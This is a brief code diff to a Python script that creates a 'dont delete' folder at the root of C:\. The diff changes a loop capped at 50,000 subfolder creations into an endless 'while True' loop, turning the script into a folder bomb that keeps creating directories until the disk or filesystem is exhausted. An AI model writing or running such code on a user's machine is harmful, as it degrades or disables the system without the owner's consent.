@@ -4,9 +4,10 @@ import os
 path = "C:\\"
 os.makedirs(f"{path}dont delete")
 count = 0
-while count < 50000:
+while True:
     os.makedirs(f"{path}dont delete\\{count}")
     count += 1
+    print("folder creating")
 
 
 
